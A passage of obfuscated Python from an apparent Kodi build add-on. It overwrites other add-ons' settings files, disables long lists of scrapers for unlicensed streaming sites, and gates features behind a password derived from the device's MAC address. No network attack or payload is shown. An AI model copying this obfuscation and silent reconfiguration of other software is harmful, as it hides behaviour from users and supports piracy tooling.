		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1190
    with open (OOOOO0OO00O000O0O ,'w')as O00OOOO0OOOO0O00O :#line:1193
      O00OOOO0OOOO0O00O .write (OO0O000OOOO0OOOO0 )#line:1194
def rdbuildinstallON ():#line:1197
    try :#line:1199
       OO00OO00OO0O00OOO =ADDONPATH +"/resources/rd/victory.xml"#line:1200
       O00OO00OOOO0000O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1201
       copyfile (OO00OO00OO0O00OOO ,O00OO00OOOO0000O0 )#line:1203
       OO00OO00OO0O00OOO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1205
       O00OO00OOOO0000O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1206
       copyfile (OO00OO00OO0O00OOO ,O00OO00OOOO0000O0 )#line:1208
       OO00OO00OO0O00OOO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1210
       O00OO00OOOO0000O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1211
       copyfile (OO00OO00OO0O00OOO ,O00OO00OOOO0000O0 )#line:1213
       OO00OO00OO0O00OOO =ADDONPATH +"/resources/rd/Splash.png"#line:1216
       O00OO00OOOO0000O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1217
       copyfile (OO00OO00OO0O00OOO ,O00OO00OOOO0000O0 )#line:1219
    except :#line:1221
       pass #line:1222
def rdbuild ():#line:1232
	O0O0O0OOO000OOO0O =(ADDON .getSetting ("rdbuild"))#line:1233
	if O0O0O0OOO000OOO0O =='true':#line:1234
		OOO0000000OOO0O00 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1235
		OOO0000000OOO0O00 .setSetting ('all_t','0')#line:1236
		OOO0000000OOO0O00 .setSetting ('rd_menu_enable','false')#line:1237
		OOO0000000OOO0O00 .setSetting ('magnet_bay','false')#line:1238
		OOO0000000OOO0O00 .setSetting ('magnet_extra','false')#line:1239
		OOO0000000OOO0O00 .setSetting ('rd_only','false')#line:1240
		OOO0000000OOO0O00 .setSetting ('ftp','false')#line:1242
		OOO0000000OOO0O00 .setSetting ('fp','false')#line:1243
		OOO0000000OOO0O00 .setSetting ('filter_fp','false')#line:1244
		OOO0000000OOO0O00 .setSetting ('fp_size_en','false')#line:1245
		OOO0000000OOO0O00 .setSetting ('afdah','false')#line:1246
		OOO0000000OOO0O00 .setSetting ('ap2s','false')#line:1247
		OOO0000000OOO0O00 .setSetting ('cin','false')#line:1248
		OOO0000000OOO0O00 .setSetting ('clv','false')#line:1249
		OOO0000000OOO0O00 .setSetting ('cmv','false')#line:1250
		OOO0000000OOO0O00 .setSetting ('dl20','false')#line:1251
		OOO0000000OOO0O00 .setSetting ('esc','false')#line:1252
		OOO0000000OOO0O00 .setSetting ('extra','false')#line:1253
		OOO0000000OOO0O00 .setSetting ('film','false')#line:1254
		OOO0000000OOO0O00 .setSetting ('fre','false')#line:1255
		OOO0000000OOO0O00 .setSetting ('fxy','false')#line:1256
		OOO0000000OOO0O00 .setSetting ('genv','false')#line:1257
		OOO0000000OOO0O00 .setSetting ('getgo','false')#line:1258
		OOO0000000OOO0O00 .setSetting ('gold','false')#line:1259
		OOO0000000OOO0O00 .setSetting ('gona','false')#line:1260
		OOO0000000OOO0O00 .setSetting ('hdmm','false')#line:1261
		OOO0000000OOO0O00 .setSetting ('hdt','false')#line:1262
		OOO0000000OOO0O00 .setSetting ('icy','false')#line:1263
		OOO0000000OOO0O00 .setSetting ('ind','false')#line:1264
		OOO0000000OOO0O00 .setSetting ('iwi','false')#line:1265
		OOO0000000OOO0O00 .setSetting ('jen_free','false')#line:1266
		OOO0000000OOO0O00 .setSetting ('kiss','false')#line:1267
		OOO0000000OOO0O00 .setSetting ('lavin','false')#line:1268
		OOO0000000OOO0O00 .setSetting ('los','false')#line:1269
		OOO0000000OOO0O00 .setSetting ('m4u','false')#line:1270
		OOO0000000OOO0O00 .setSetting ('mesh','false')#line:1271
		OOO0000000OOO0O00 .setSetting ('mf','false')#line:1272
		OOO0000000OOO0O00 .setSetting ('mkvc','false')#line:1273
		OOO0000000OOO0O00 .setSetting ('mjy','false')#line:1274
		OOO0000000OOO0O00 .setSetting ('hdonline','false')#line:1275
		OOO0000000OOO0O00 .setSetting ('moviex','false')#line:1276
		OOO0000000OOO0O00 .setSetting ('mpr','false')#line:1277
		OOO0000000OOO0O00 .setSetting ('mvg','false')#line:1278
		OOO0000000OOO0O00 .setSetting ('mvl','false')#line:1279
		OOO0000000OOO0O00 .setSetting ('mvs','false')#line:1280
		OOO0000000OOO0O00 .setSetting ('myeg','false')#line:1281
		OOO0000000OOO0O00 .setSetting ('ninja','false')#line:1282
		OOO0000000OOO0O00 .setSetting ('odb','false')#line:1283
		OOO0000000OOO0O00 .setSetting ('ophd','false')#line:1284
		OOO0000000OOO0O00 .setSetting ('pks','false')#line:1285
		OOO0000000OOO0O00 .setSetting ('prf','false')#line:1286
		OOO0000000OOO0O00 .setSetting ('put18','false')#line:1287
		OOO0000000OOO0O00 .setSetting ('req','false')#line:1288
		OOO0000000OOO0O00 .setSetting ('rftv','false')#line:1289
		OOO0000000OOO0O00 .setSetting ('rltv','false')#line:1290
		OOO0000000OOO0O00 .setSetting ('sc','false')#line:1291
		OOO0000000OOO0O00 .setSetting ('seehd','false')#line:1292
		OOO0000000OOO0O00 .setSetting ('showbox','false')#line:1293
		OOO0000000OOO0O00 .setSetting ('shuid','false')#line:1294
		OOO0000000OOO0O00 .setSetting ('sil_gh','false')#line:1295
		OOO0000000OOO0O00 .setSetting ('spv','false')#line:1296
		OOO0000000OOO0O00 .setSetting ('subs','false')#line:1297
		OOO0000000OOO0O00 .setSetting ('tvs','false')#line:1298
		OOO0000000OOO0O00 .setSetting ('tw','false')#line:1299
		OOO0000000OOO0O00 .setSetting ('upto','false')#line:1300
		OOO0000000OOO0O00 .setSetting ('vel','false')#line:1301
		OOO0000000OOO0O00 .setSetting ('vex','false')#line:1302
		OOO0000000OOO0O00 .setSetting ('vidc','false')#line:1303
		OOO0000000OOO0O00 .setSetting ('w4hd','false')#line:1304
		OOO0000000OOO0O00 .setSetting ('wav','false')#line:1305
		OOO0000000OOO0O00 .setSetting ('wf','false')#line:1306
		OOO0000000OOO0O00 .setSetting ('wse','false')#line:1307
		OOO0000000OOO0O00 .setSetting ('wss','false')#line:1308
		OOO0000000OOO0O00 .setSetting ('wsse','false')#line:1309
		OOO0000000OOO0O00 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1310
		OOO0000000OOO0O00 .setSetting ('debrid.only','true')#line:1311
		OOO0000000OOO0O00 .setSetting ('hosts.captcha','false')#line:1312
		OOO0000000OOO0O00 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1313
		OOO0000000OOO0O00 .setSetting ('provider.123moviehd','false')#line:1314
		OOO0000000OOO0O00 .setSetting ('provider.300mbdownload','false')#line:1315
		OOO0000000OOO0O00 .setSetting ('provider.alltube','false')#line:1316
		OOO0000000OOO0O00 .setSetting ('provider.allucde','false')#line:1317
		OOO0000000OOO0O00 .setSetting ('provider.animebase','false')#line:1318
		OOO0000000OOO0O00 .setSetting ('provider.animeloads','false')#line:1319
		OOO0000000OOO0O00 .setSetting ('provider.animetoon','false')#line:1320
		OOO0000000OOO0O00 .setSetting ('provider.bnwmovies','false')#line:1321
		OOO0000000OOO0O00 .setSetting ('provider.boxfilm','false')#line:1322
		OOO0000000OOO0O00 .setSetting ('provider.bs','false')#line:1323
		OOO0000000OOO0O00 .setSetting ('provider.cartoonhd','false')#line:1324
		OOO0000000OOO0O00 .setSetting ('provider.cdahd','false')#line:1325
		OOO0000000OOO0O00 .setSetting ('provider.cdax','false')#line:1326
		OOO0000000OOO0O00 .setSetting ('provider.cine','false')#line:1327
		OOO0000000OOO0O00 .setSetting ('provider.cinenator','false')#line:1328
		OOO0000000OOO0O00 .setSetting ('provider.cmovieshdbz','false')#line:1329
		OOO0000000OOO0O00 .setSetting ('provider.coolmoviezone','false')#line:1330
		OOO0000000OOO0O00 .setSetting ('provider.ddl','false')#line:1331
		OOO0000000OOO0O00 .setSetting ('provider.deepmovie','false')#line:1332
		OOO0000000OOO0O00 .setSetting ('provider.ekinomaniak','false')#line:1333
		OOO0000000OOO0O00 .setSetting ('provider.ekinotv','false')#line:1334
		OOO0000000OOO0O00 .setSetting ('provider.filiser','false')#line:1335
		OOO0000000OOO0O00 .setSetting ('provider.filmpalast','false')#line:1336
		OOO0000000OOO0O00 .setSetting ('provider.filmwebbooster','false')#line:1337
		OOO0000000OOO0O00 .setSetting ('provider.filmxy','false')#line:1338
		OOO0000000OOO0O00 .setSetting ('provider.fmovies','false')#line:1339
		OOO0000000OOO0O00 .setSetting ('provider.foxx','false')#line:1340
		OOO0000000OOO0O00 .setSetting ('provider.freefmovies','false')#line:1341
		OOO0000000OOO0O00 .setSetting ('provider.freeputlocker','false')#line:1342
		OOO0000000OOO0O00 .setSetting ('provider.furk','false')#line:1343
		OOO0000000OOO0O00 .setSetting ('provider.gamatotv','false')#line:1344
		OOO0000000OOO0O00 .setSetting ('provider.gogoanime','false')#line:1345
		OOO0000000OOO0O00 .setSetting ('provider.gowatchseries','false')#line:1346
		OOO0000000OOO0O00 .setSetting ('provider.hackimdb','false')#line:1347
		OOO0000000OOO0O00 .setSetting ('provider.hdfilme','false')#line:1348
		OOO0000000OOO0O00 .setSetting ('provider.hdmto','false')#line:1349
		OOO0000000OOO0O00 .setSetting ('provider.hdpopcorns','false')#line:1350
		OOO0000000OOO0O00 .setSetting ('provider.hdstreams','false')#line:1351
		OOO0000000OOO0O00 .setSetting ('provider.horrorkino','false')#line:1353
		OOO0000000OOO0O00 .setSetting ('provider.iitv','false')#line:1354
		OOO0000000OOO0O00 .setSetting ('provider.iload','false')#line:1355
		OOO0000000OOO0O00 .setSetting ('provider.iwaatch','false')#line:1356
		OOO0000000OOO0O00 .setSetting ('provider.kinodogs','false')#line:1357
		OOO0000000OOO0O00 .setSetting ('provider.kinoking','false')#line:1358
		OOO0000000OOO0O00 .setSetting ('provider.kinow','false')#line:1359
		OOO0000000OOO0O00 .setSetting ('provider.kinox','false')#line:1360
		OOO0000000OOO0O00 .setSetting ('provider.lichtspielhaus','false')#line:1361
		OOO0000000OOO0O00 .setSetting ('provider.liomenoi','false')#line:1362
		OOO0000000OOO0O00 .setSetting ('provider.magnetdl','false')#line:1365
		OOO0000000OOO0O00 .setSetting ('provider.megapelistv','false')#line:1366
		OOO0000000OOO0O00 .setSetting ('provider.movie2k-ac','false')#line:1367
		OOO0000000OOO0O00 .setSetting ('provider.movie2k-ag','false')#line:1368
		OOO0000000OOO0O00 .setSetting ('provider.movie2z','false')#line:1369
		OOO0000000OOO0O00 .setSetting ('provider.movie4k','false')#line:1370
		OOO0000000OOO0O00 .setSetting ('provider.movie4kis','false')#line:1371
		OOO0000000OOO0O00 .setSetting ('provider.movieneo','false')#line:1372
		OOO0000000OOO0O00 .setSetting ('provider.moviesever','false')#line:1373
		OOO0000000OOO0O00 .setSetting ('provider.movietown','false')#line:1374
		OOO0000000OOO0O00 .setSetting ('provider.mvrls','false')#line:1376
		OOO0000000OOO0O00 .setSetting ('provider.netzkino','false')#line:1377
		OOO0000000OOO0O00 .setSetting ('provider.odb','false')#line:1378
		OOO0000000OOO0O00 .setSetting ('provider.openkatalog','false')#line:1379
		OOO0000000OOO0O00 .setSetting ('provider.ororo','false')#line:1380
		OOO0000000OOO0O00 .setSetting ('provider.paczamy','false')#line:1381
		OOO0000000OOO0O00 .setSetting ('provider.peliculasdk','false')#line:1382
		OOO0000000OOO0O00 .setSetting ('provider.pelisplustv','false')#line:1383
		OOO0000000OOO0O00 .setSetting ('provider.pepecine','false')#line:1384
		OOO0000000OOO0O00 .setSetting ('provider.primewire','false')#line:1385
		OOO0000000OOO0O00 .setSetting ('provider.projectfreetv','false')#line:1386
		OOO0000000OOO0O00 .setSetting ('provider.proxer','false')#line:1387
		OOO0000000OOO0O00 .setSetting ('provider.pureanime','false')#line:1388
		OOO0000000OOO0O00 .setSetting ('provider.putlocker','false')#line:1389
		OOO0000000OOO0O00 .setSetting ('provider.putlockerfree','false')#line:1390
		OOO0000000OOO0O00 .setSetting ('provider.reddit','false')#line:1391
		OOO0000000OOO0O00 .setSetting ('provider.cartoonwire','false')#line:1392
		OOO0000000OOO0O00 .setSetting ('provider.seehd','false')#line:1393
		OOO0000000OOO0O00 .setSetting ('provider.segos','false')#line:1394
		OOO0000000OOO0O00 .setSetting ('provider.serienstream','false')#line:1395
		OOO0000000OOO0O00 .setSetting ('provider.series9','false')#line:1396
		OOO0000000OOO0O00 .setSetting ('provider.seriesever','false')#line:1397
		OOO0000000OOO0O00 .setSetting ('provider.seriesonline','false')#line:1398
		OOO0000000OOO0O00 .setSetting ('provider.seriespapaya','false')#line:1399
		OOO0000000OOO0O00 .setSetting ('provider.sezonlukdizi','false')#line:1400
		OOO0000000OOO0O00 .setSetting ('provider.solarmovie','false')#line:1401
		OOO0000000OOO0O00 .setSetting ('provider.solarmoviez','false')#line:1402
		OOO0000000OOO0O00 .setSetting ('provider.stream-to','false')#line:1403
		OOO0000000OOO0O00 .setSetting ('provider.streamdream','false')#line:1404
		OOO0000000OOO0O00 .setSetting ('provider.streamflix','false')#line:1405
		OOO0000000OOO0O00 .setSetting ('provider.streamit','false')#line:1406
		OOO0000000OOO0O00 .setSetting ('provider.swatchseries','false')#line:1407
		OOO0000000OOO0O00 .setSetting ('provider.szukajkatv','false')#line:1408
		OOO0000000OOO0O00 .setSetting ('provider.tainiesonline','false')#line:1409
		OOO0000000OOO0O00 .setSetting ('provider.tainiomania','false')#line:1410
		OOO0000000OOO0O00 .setSetting ('provider.tata','false')#line:1413
		OOO0000000OOO0O00 .setSetting ('provider.trt','false')#line:1414
		OOO0000000OOO0O00 .setSetting ('provider.tvbox','false')#line:1415
		OOO0000000OOO0O00 .setSetting ('provider.ultrahd','false')#line:1416
		OOO0000000OOO0O00 .setSetting ('provider.video4k','false')#line:1417
		OOO0000000OOO0O00 .setSetting ('provider.vidics','false')#line:1418
		OOO0000000OOO0O00 .setSetting ('provider.view4u','false')#line:1419
		OOO0000000OOO0O00 .setSetting ('provider.watchseries','false')#line:1420
		OOO0000000OOO0O00 .setSetting ('provider.xrysoi','false')#line:1421
		OOO0000000OOO0O00 .setSetting ('provider.library','false')#line:1422
def fixfont ():#line:1425
	OO0O00O00OOO00OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1426
	OOO0O00OOO0OO0000 =json .loads (OO0O00O00OOO00OOO );#line:1428
	OO0OO000OOO0OOOO0 =OOO0O00OOO0OO0000 ["result"]["settings"]#line:1429
	O0OOOO00000OOO0OO =[OOOOO00O000O00OO0 for OOOOO00O000O00OO0 in OO0OO000OOO0OOOO0 if OOOOO00O000O00OO0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1431
	OOOOOO00OOOO0O000 =O0OOOO00000OOO0OO ["options"];#line:1432
	O000OOOOO000OO000 =O0OOOO00000OOO0OO ["value"];#line:1433
	OOO0OOOO000O00OO0 =[OO0000O0OOOO0000O for (OO0000O0OOOO0000O ,O0000O00O0O00O000 )in enumerate (OOOOOO00OOOO0O000 )if O0000O00O0O00O000 ["value"]==O000OOOOO000OO000 ][0 ];#line:1435
	OO00O00OO0O0O00OO =(OOO0OOOO000O00OO0 +1 )%len (OOOOOO00OOOO0O000 )#line:1437
	O0OOOOOOOO00O000O =OOOOOO00OOOO0O000 [OO00O00OO0O0O00OO ]["value"]#line:1439
	OO0OO0OO0OOO0OOOO =OOOOOO00OOOO0O000 [OO00O00OO0O0O00OO ]["label"]#line:1440
	OOOO00OO000OOO0O0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1442
	try :#line:1444
		O0OOOO0OOO0O0O0O0 =json .loads (OOOO00OO000OOO0O0 );#line:1445
		if O0OOOO0OOO0O0O0O0 ["result"]!=True :#line:1447
			raise Exception #line:1448
	except :#line:1449
		sys .stderr .write ("Error switching audio output device")#line:1450
		raise Exception #line:1451
def parseDOM2 (O0O0O000O0O00O00O ,name =u"",attrs ={},ret =False ):#line:1452
	if isinstance (O0O0O000O0O00O00O ,str ):#line:1455
		try :#line:1456
			O0O0O000O0O00O00O =[O0O0O000O0O00O00O .decode ("utf-8")]#line:1457
		except :#line:1458
			O0O0O000O0O00O00O =[O0O0O000O0O00O00O ]#line:1459
	elif isinstance (O0O0O000O0O00O00O ,unicode ):#line:1460
		O0O0O000O0O00O00O =[O0O0O000O0O00O00O ]#line:1461
	elif not isinstance (O0O0O000O0O00O00O ,list ):#line:1462
		return u""#line:1463
	if not name .strip ():#line:1465
		return u""#line:1466
	OOO0O0OOOOOOO0OOO =[]#line:1468
	for O00OOOO000OO00O0O in O0O0O000O0O00O00O :#line:1469
		OO00O0OOO0OOOOOO0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O00OOOO000OO00O0O )#line:1470
		for OO000O000O0O0O0O0 in OO00O0OOO0OOOOOO0 :#line:1471
			O00OOOO000OO00O0O =O00OOOO000OO00O0O .replace (OO000O000O0O0O0O0 ,OO000O000O0O0O0O0 .replace ("\n"," "))#line:1472
		O00OOO0O0000O00O0 =[]#line:1474
		for O0O0OO0000O0OOOO0 in attrs :#line:1475
			OOOOO0OO00OO0OOOO =re .compile ('(<'+name +'[^>]*?(?:'+O0O0OO0000O0OOOO0 +'=[\'"]'+attrs [O0O0OO0000O0OOOO0 ]+'[\'"].*?>))',re .M |re .S ).findall (O00OOOO000OO00O0O )#line:1476
			if len (OOOOO0OO00OO0OOOO )==0 and attrs [O0O0OO0000O0OOOO0 ].find (" ")==-1 :#line:1477
				OOOOO0OO00OO0OOOO =re .compile ('(<'+name +'[^>]*?(?:'+O0O0OO0000O0OOOO0 +'='+attrs [O0O0OO0000O0OOOO0 ]+'.*?>))',re .M |re .S ).findall (O00OOOO000OO00O0O )#line:1478
			if len (O00OOO0O0000O00O0 )==0 :#line:1480
				O00OOO0O0000O00O0 =OOOOO0OO00OO0OOOO #line:1481
				OOOOO0OO00OO0OOOO =[]#line:1482
			else :#line:1483
				OO0OOOO0OOO000OOO =range (len (O00OOO0O0000O00O0 ))#line:1484
				OO0OOOO0OOO000OOO .reverse ()#line:1485
				for OO0OOO0O000O0O0O0 in OO0OOOO0OOO000OOO :#line:1486
					if not O00OOO0O0000O00O0 [OO0OOO0O000O0O0O0 ]in OOOOO0OO00OO0OOOO :#line:1487
						del (O00OOO0O0000O00O0 [OO0OOO0O000O0O0O0 ])#line:1488
		if len (O00OOO0O0000O00O0 )==0 and attrs =={}:#line:1490
			O00OOO0O0000O00O0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O00OOOO000OO00O0O )#line:1491
			if len (O00OOO0O0000O00O0 )==0 :#line:1492
				O00OOO0O0000O00O0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O00OOOO000OO00O0O )#line:1493
		if isinstance (ret ,str ):#line:1495
			OOOOO0OO00OO0OOOO =[]#line:1496
			for OO000O000O0O0O0O0 in O00OOO0O0000O00O0 :#line:1497
				O00OOO0OO0O0OOOOO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO000O000O0O0O0O0 )#line:1498
				if len (O00OOO0OO0O0OOOOO )==0 :#line:1499
					O00OOO0OO0O0OOOOO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO000O000O0O0O0O0 )#line:1500
				for O0OO00OOOOOOOOO00 in O00OOO0OO0O0OOOOO :#line:1501
					OO000OOO0O000O0OO =O0OO00OOOOOOOOO00 [0 ]#line:1502
					if OO000OOO0O000O0OO in "'\"":#line:1503
						if O0OO00OOOOOOOOO00 .find ('='+OO000OOO0O000O0OO ,O0OO00OOOOOOOOO00 .find (OO000OOO0O000O0OO ,1 ))>-1 :#line:1504
							O0OO00OOOOOOOOO00 =O0OO00OOOOOOOOO00 [:O0OO00OOOOOOOOO00 .find ('='+OO000OOO0O000O0OO ,O0OO00OOOOOOOOO00 .find (OO000OOO0O000O0OO ,1 ))]#line:1505
						if O0OO00OOOOOOOOO00 .rfind (OO000OOO0O000O0OO ,1 )>-1 :#line:1507
							O0OO00OOOOOOOOO00 =O0OO00OOOOOOOOO00 [1 :O0OO00OOOOOOOOO00 .rfind (OO000OOO0O000O0OO )]#line:1508
					else :#line:1509
						if O0OO00OOOOOOOOO00 .find (" ")>0 :#line:1510
							O0OO00OOOOOOOOO00 =O0OO00OOOOOOOOO00 [:O0OO00OOOOOOOOO00 .find (" ")]#line:1511
						elif O0OO00OOOOOOOOO00 .find ("/")>0 :#line:1512
							O0OO00OOOOOOOOO00 =O0OO00OOOOOOOOO00 [:O0OO00OOOOOOOOO00 .find ("/")]#line:1513
						elif O0OO00OOOOOOOOO00 .find (">")>0 :#line:1514
							O0OO00OOOOOOOOO00 =O0OO00OOOOOOOOO00 [:O0OO00OOOOOOOOO00 .find (">")]#line:1515
					OOOOO0OO00OO0OOOO .append (O0OO00OOOOOOOOO00 .strip ())#line:1517
			O00OOO0O0000O00O0 =OOOOO0OO00OO0OOOO #line:1518
		else :#line:1519
			OOOOO0OO00OO0OOOO =[]#line:1520
			for OO000O000O0O0O0O0 in O00OOO0O0000O00O0 :#line:1521
				O0O00OOOOOOOOOO0O =u"</"+name #line:1522
				OOOOO0O0OOOOOOO00 =O00OOOO000OO00O0O .find (OO000O000O0O0O0O0 )#line:1524
				OOO0000OO00O000OO =O00OOOO000OO00O0O .find (O0O00OOOOOOOOOO0O ,OOOOO0O0OOOOOOO00 )#line:1525
				OOOO00O0O00O0000O =O00OOOO000OO00O0O .find ("<"+name ,OOOOO0O0OOOOOOO00 +1 )#line:1526
				while OOOO00O0O00O0000O <OOO0000OO00O000OO and OOOO00O0O00O0000O !=-1 :#line:1528
					OOO0OO0OOO00O0OO0 =O00OOOO000OO00O0O .find (O0O00OOOOOOOOOO0O ,OOO0000OO00O000OO +len (O0O00OOOOOOOOOO0O ))#line:1529
					if OOO0OO0OOO00O0OO0 !=-1 :#line:1530
						OOO0000OO00O000OO =OOO0OO0OOO00O0OO0 #line:1531
					OOOO00O0O00O0000O =O00OOOO000OO00O0O .find ("<"+name ,OOOO00O0O00O0000O +1 )#line:1532
				if OOOOO0O0OOOOOOO00 ==-1 and OOO0000OO00O000OO ==-1 :#line:1534
					O0O0O00OOOOO0O000 =u""#line:1535
				elif OOOOO0O0OOOOOOO00 >-1 and OOO0000OO00O000OO >-1 :#line:1536
					O0O0O00OOOOO0O000 =O00OOOO000OO00O0O [OOOOO0O0OOOOOOO00 +len (OO000O000O0O0O0O0 ):OOO0000OO00O000OO ]#line:1537
				elif OOO0000OO00O000OO >-1 :#line:1538
					O0O0O00OOOOO0O000 =O00OOOO000OO00O0O [:OOO0000OO00O000OO ]#line:1539
				elif OOOOO0O0OOOOOOO00 >-1 :#line:1540
					O0O0O00OOOOO0O000 =O00OOOO000OO00O0O [OOOOO0O0OOOOOOO00 +len (OO000O000O0O0O0O0 ):]#line:1541
				if ret :#line:1543
					O0O00OOOOOOOOOO0O =O00OOOO000OO00O0O [OOO0000OO00O000OO :O00OOOO000OO00O0O .find (">",O00OOOO000OO00O0O .find (O0O00OOOOOOOOOO0O ))+1 ]#line:1544
					O0O0O00OOOOO0O000 =OO000O000O0O0O0O0 +O0O0O00OOOOO0O000 +O0O00OOOOOOOOOO0O #line:1545
				O00OOOO000OO00O0O =O00OOOO000OO00O0O [O00OOOO000OO00O0O .find (O0O0O00OOOOO0O000 ,O00OOOO000OO00O0O .find (OO000O000O0O0O0O0 ))+len (O0O0O00OOOOO0O000 ):]#line:1547
				OOOOO0OO00OO0OOOO .append (O0O0O00OOOOO0O000 )#line:1548
			O00OOO0O0000O00O0 =OOOOO0OO00OO0OOOO #line:1549
		OOO0O0OOOOOOO0OOO +=O00OOO0O0000O00O0 #line:1550
	return OOO0O0OOOOOOO0OOO #line:1552
def addItem (OO0O00OO0OOOOO0OO ,OOO0OOO00O000O0O0 ,O000OOOOOOOO000O0 ,OO0O00OO0OOO0OO0O ,O0OOOOOOOOOO0OO0O ,description =None ):#line:1554
	if description ==None :description =''#line:1555
	description ='[COLOR white]'+description +'[/COLOR]'#line:1556
	O00OOO00OOO0000OO =sys .argv [0 ]+"?url="+urllib .quote_plus (OOO0OOO00O000O0O0 )+"&mode="+str (O000OOOOOOOO000O0 )+"&name="+urllib .quote_plus (OO0O00OO0OOOOO0OO )+"&iconimage="+urllib .quote_plus (OO0O00OO0OOO0OO0O )+"&fanart="+urllib .quote_plus (O0OOOOOOOOOO0OO0O )#line:1557
	O00OO0O00OO000OOO =True #line:1558
	O0OOO000O0O0OO000 =xbmcgui .ListItem (OO0O00OO0OOOOO0OO ,iconImage =OO0O00OO0OOO0OO0O ,thumbnailImage =OO0O00OO0OOO0OO0O )#line:1559
	O0OOO000O0O0OO000 .setInfo (type ="Video",infoLabels ={"Title":OO0O00OO0OOOOO0OO ,"Plot":description })#line:1560
	O0OOO000O0O0OO000 .setProperty ("fanart_Image",O0OOOOOOOOOO0OO0O )#line:1561
	O0OOO000O0O0OO000 .setProperty ("icon_Image",OO0O00OO0OOO0OO0O )#line:1562
	O00OO0O00OO000OOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00OOO00OOO0000OO ,listitem =O0OOO000O0O0OO000 ,isFolder =False )#line:1563
	return O00OO0O00OO000OOO #line:1564
def get_params ():#line:1566
		O00OOOOO0OOO0O0O0 =[]#line:1567
		OOOOO0O00O000O00O =sys .argv [2 ]#line:1568
		if len (OOOOO0O00O000O00O )>=2 :#line:1569
				OO0OO0O0OOOO0000O =sys .argv [2 ]#line:1570
				OOOO0OO000O0OO0O0 =OO0OO0O0OOOO0000O .replace ('?','')#line:1571
				if (OO0OO0O0OOOO0000O [len (OO0OO0O0OOOO0000O )-1 ]=='/'):#line:1572
						OO0OO0O0OOOO0000O =OO0OO0O0OOOO0000O [0 :len (OO0OO0O0OOOO0000O )-2 ]#line:1573
				O000OO0OO0O0O0O0O =OOOO0OO000O0OO0O0 .split ('&')#line:1574
				O00OOOOO0OOO0O0O0 ={}#line:1575
				for OOOOO0OOO00OOOO00 in range (len (O000OO0OO0O0O0O0O )):#line:1576
						OO000O0000O000OO0 ={}#line:1577
						OO000O0000O000OO0 =O000OO0OO0O0O0O0O [OOOOO0OOO00OOOO00 ].split ('=')#line:1578
						if (len (OO000O0000O000OO0 ))==2 :#line:1579
								O00OOOOO0OOO0O0O0 [OO000O0000O000OO0 [0 ]]=OO000O0000O000OO0 [1 ]#line:1580
		return O00OOOOO0OOO0O0O0 #line:1582
def decode (O0000OOOO00000000 ,O00OOOO0OO00O00O0 ):#line:1587
    import base64 #line:1588
    O00O00000O00O0O0O =[]#line:1589
    if (len (O0000OOOO00000000 ))!=4 :#line:1591
     return 10 #line:1592
    O00OOOO0OO00O00O0 =base64 .urlsafe_b64decode (O00OOOO0OO00O00O0 )#line:1593
    for OOO000O0OO0OO0OO0 in range (len (O00OOOO0OO00O00O0 )):#line:1595
        OOO0OO00OOOO00O00 =O0000OOOO00000000 [OOO000O0OO0OO0OO0 %len (O0000OOOO00000000 )]#line:1596
        O00O0OOO0O0O0OO0O =chr ((256 +ord (O00OOOO0OO00O00O0 [OOO000O0OO0OO0OO0 ])-ord (OOO0OO00OOOO00O00 ))%256 )#line:1597
        O00O00000O00O0O0O .append (O00O0OOO0O0O0OO0O )#line:1598
    return "".join (O00O00000O00O0O0O )#line:1599
def tmdb_list (OOOOOOOOOO0O0O0O0 ):#line:1600
    O0O0OO0O0O00O00OO =decode ("7643",OOOOOOOOOO0O0O0O0 )#line:1603
    return int (O0O0OO0O0O00O00OO )#line:1606
def u_list (OOOOOOO00OO00O00O ):#line:1607
    from math import sqrt #line:1609
    OOO000OO0O000OO0O =tmdb_list (TMDB_NEW_API )#line:1610
    OO0OOO0O00OOOO0O0 =str ((getHwAddr ('eth0'))*OOO000OO0O000OO0O )#line:1612
    OO0OO0OO000O0O000 =int (OO0OOO0O00OOOO0O0 [1 ]+OO0OOO0O00OOOO0O0 [2 ]+OO0OOO0O00OOOO0O0 [5 ]+OO0OOO0O00OOOO0O0 [7 ])#line:1613
    OO0O0OO00OO0OO0O0 =(ADDON .getSetting ("pass"))#line:1615
    OOOOOO0O00O00OOOO =(str (round (sqrt ((OO0OO0OO000O0O000 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1620
    if '.'in OOOOOO0O00O00OOOO :#line:1621
     OOOOOO0O00O00OOOO =(str (round (sqrt ((OO0OO0OO000O0O000 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1622
    if OO0O0OO00OO0OO0O0 ==OOOOOO0O00O00OOOO :#line:1624
      OOOOOO0OO000OOO0O =OOOOOOO00OO00O00O #line:1626
    else :#line:1628
       if STARTP2 ()and STARTP ()=='ok':#line:1629
         return OOOOOOO00OO00O00O #line:1632
